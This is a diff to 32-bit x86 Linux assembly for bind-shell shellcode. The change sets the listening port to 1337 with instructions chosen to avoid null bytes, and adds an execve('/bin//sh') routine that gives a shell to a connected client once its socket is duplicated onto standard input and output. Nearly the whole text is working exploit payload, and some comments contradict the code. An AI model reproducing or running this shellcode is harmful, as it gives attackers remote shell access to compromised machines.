@@ -30,9 +30,14 @@ bindsckcode:
    xor     eax,eax
    push    eax          ;sin_addr
 
-;replace 3412 below wih desired port number. remember byte order!
-   push    0x341201ff   ;sin_family sin_port(3412) (02ff changed to 01ff)
-   inc     dword [esp]  ;This was added to change ff01 to 0002 to avoid nulls
+;replace 3905 below wih desired port number. remember byte order!
+   push    0x39050103   ;sin_family sin_port(1337) (fff2 changed to 0002)
+   inc     esp          ;The next 6 lines are to change 0103 to 0002 w/o using nulls
+   inc     esp
+   inc     eax
+   inc     eax 
+   push    ax
+   xor     eax, eax
    mov     edi,esp      ;sockaddr_in*
    push    eax          ;protocol
    push    byte SOCK_STREAM   ;type
@@ -71,4 +76,13 @@ dup_loop:
    inc     ecx
    loop    dup_loop
 ;at this point we have a connected client dup'ed onto 0,1,2
-
+;All that is left to do is shovel a shell
+;code from delirium paper
+   xor 		eax,eax          ;eax  = 0002
+   push		eax              ;zero on stack
+   push     0x68732f2f       ;"//sh"
+   push     0x6e69622f	     ;"/bin"
+   mov 		ebx, esp         ;ebx=esp=&argv
+   cdq                       ;extend eax into edx (Convert Dword to QuadWord)   
+   mov      al,11            ;eax = 11
+   int 0x80                  ;syscall 11 (execve)
